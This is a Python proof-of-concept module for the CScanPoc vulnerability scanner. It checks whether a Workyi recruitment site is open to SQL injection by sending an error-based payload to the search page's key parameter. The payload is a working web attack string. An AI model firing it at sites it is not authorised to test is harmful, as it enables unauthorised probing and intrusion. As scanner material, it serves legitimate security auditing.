# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Workyi_0002'  # 平台漏洞编号，留空
    name = 'Workyi人才系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-05-21'  # 漏洞公布时间
    desc = '''
        基于Asp.Net+MsSQL的开源高端人才系统,人才招聘程序.为创业者带来低投入高回报的人才系统。
        Workyi人才系统 页面参数过滤不严谨，导致SQL注入漏洞。
        /news/search.aspx?key=
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0115094'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Workyi人才系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '448a26c7-1e72-45c3-9dcf-e0c51c8d202d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # sql injection 4
            url = self.target + "/news/search.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
            code, head, res, errcode, _ = hh.http(url)
            if code == 500 and 'SQL Server' in res:
                #security_warning('workyi_system sql injection:http://www.wooyun.org/bugs/wooyun-2010-0115094 %s'%url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
